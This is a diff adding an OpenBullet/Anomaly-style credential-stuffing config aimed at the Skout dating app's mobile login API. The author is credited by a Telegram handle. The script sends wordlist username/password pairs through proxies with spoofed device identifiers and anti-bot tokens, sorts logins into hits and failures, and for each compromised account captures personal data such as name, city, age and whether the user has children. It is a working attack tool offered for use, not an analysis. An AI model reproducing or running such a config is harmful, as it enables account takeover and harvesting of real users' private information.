@@ -1,0 +1,121 @@
+[SETTINGS]
+{
+  "Name": "skout",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-31T11:37:40.5809337+02:00",
+  "AdditionalInfo": "https://t.me/Koko_Nader",
+  "Author": "𝙶𝙴𝙾𝚁𝙶𝙴 𝙽𝙰𝙳𝙴𝚁(🔝)/@Koko_Nader",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://and.skoutapis.com/api/1/auth/login/mobile" 
+  CONTENT "application_code=3456025fd1e4ec43hec488b84fd700f4&param0=<USER>&param1=<PASS>&device_brand=samsung&device_model=SM-G935F&os_version=25&ip_address=&ui=Android+SKOUT+6.45.0&latitude=&longitude=&provider=Google&locale=en_US&device_id=c0575264c704f9c6&device_imei=&device_mac=ec%3A48%3Abc%3Af0%3Af7%3A0b&device_open_id=c0575264c704f9c6&device_adv_id=639ab640-6d9c-44fc-9fda-67d0f87158fb&city_name=&state_name=&country_name=&location_locale=en" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "session_id: _" 
+  HEADER "version: 55" 
+  HEADER "signature: " 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "charset: utf-8" 
+  HEADER "app_name: skout" 
+  HEADER "app_version: 6.45.0" 
+  HEADER "app_device: android" 
+  HEADER "X-PX-AUTHORIZATION: 3:42b538975a0b405bedd53b269dc98d01a5d8c7e5bf97f878e21162a1a5ed6879:z5ZC0x3OJytSmr0oUy2zNvZEfrYvpSgYJ1tXU1hd9Ro15QUUA/gPkNwKxbtw/K9LQWUopdMQ8la8EVUNMRbWxQ==:1000:dxf60zkX9F+yGonccB2Fu4OQb8GBbRzlrt7WYY6OhlQa3LAoS2Avk8HJ/bVU3zP8i+OGUC7mmavL7fJyXBGvxE363IVpR5BUmdRYfyEjlLAkpFE/XwgmrIY+5nLs/X27vwMDuR6Ao7UmK9NZEOnI42yzL5gJfDpkOjuykb40JPNkeo+Ro0wUex2Azm0230dsXT5W7Zc6YnNF2i/gZIT1ww==" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G935F Build/N2G48H)" 
+  HEADER "Host: and.skoutapis.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 452" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY " logged in\",\"id\":" 
+    KEY ",\"session_id\":\"" 
+    KEY "\",\"privacy_protection_user_rules\"" 
+  KEYCHAIN Failure OR 
+    KEY "{\"message\":\"Invalid" 
+    KEY "Invalid username or password, please try again" 
+
+#session_id PARSE "<SOURCE>" JSON "session_id" -> VAR "session_id" 
+
+REQUEST GET "https://and.skoutapis.com/api/1/me?application_code=3456025fd1e4ec43hec488b84fd700f4&rand_token=09bc5500-f059-4da1-9deb-734f2507b103" 
+  
+  HEADER "session_id: <session_id>" 
+  HEADER "app_name: skout" 
+  HEADER "app_version: 6.45.0" 
+  HEADER "app_device: android" 
+  HEADER "X-PX-AUTHORIZATION: 3:a3e778427184fc0476ac64603b1b72174a4c9322fb9e60818aa183e6673e4e2e:CyHbHwLBgPc3JlosDhLbGhL8fGu1Hf+QMIAcYMPTttQh+nLM7Cf34Ejle0kux2V8FPHgmPvx2Z4SDA/ouravOg==:1000:8HhESKk+2VHzO35JUVhhZdDBjn78W7KqvAkHue8rDBSz7taROINqbE6222FCdLb4wJcLWPAqi25lM3zdJ6nP5keTHjJdW5bCMPPUTu1jbgMDk6IXK0wEqV4scT68k1zKxWsq5ULVT6l9aCOwMOy2VZz89eR7PMsKt6qEjG2Bl5M42J31Ob71m68tFbBoYtOZ3Wz/6+/DOUUnHKCH29JUoQ==" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G935F Build/N2G48H)" 
+  HEADER "Host: and.skoutapis.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#name PARSE "<SOURCE>" JSON "name" CreateEmpty=FALSE -> CAP "name" 
+
+#country PARSE "<SOURCE>" JSON "country" CreateEmpty=FALSE -> CAP "country" 
+
+#city PARSE "<SOURCE>" JSON "city" CreateEmpty=FALSE -> CAP "city" 
+
+#age PARSE "<SOURCE>" JSON "age" CreateEmpty=FALSE -> CAP "age" 
+
+#points PARSE "<SOURCE>" JSON "points" CreateEmpty=FALSE -> CAP "points" 
+
+#search_level PARSE "<SOURCE>" JSON "search_level" CreateEmpty=FALSE -> CAP "search_level" 
+
+#has_picture PARSE "<SOURCE>" JSON "has_picture" CreateEmpty=FALSE -> CAP "has_picture" 
+
+#friends_count PARSE "<SOURCE>" JSON "friends_count" CreateEmpty=FALSE -> CAP "friends_count" 
+
+#pending_friends_count PARSE "<SOURCE>" JSON "pending_friends_count" CreateEmpty=FALSE -> CAP "pending_friends_count" 
+
+#friend_status PARSE "<SOURCE>" JSON "friend_status" CreateEmpty=FALSE -> CAP "friend_status" 
+
+#email_notifications_enabled PARSE "<SOURCE>" JSON "email_notifications_enabled" CreateEmpty=FALSE -> CAP "email_notifications_enabled" 
+
+#vip_expiration_date PARSE "<SOURCE>" JSON "vip_expiration_date" CreateEmpty=FALSE -> CAP "vip_expiration_date" 
+
+#has_children PARSE "<SOURCE>" JSON "has_children" CreateEmpty=FALSE -> CAP "has_children" 
+
+#see FUNCTION Constant "𝙶𝙴𝙾𝚁𝙶𝙴 𝙽𝙰𝙳𝙴𝚁(🔝)/@Koko_Nader" -> CAP "Checked By" 
+
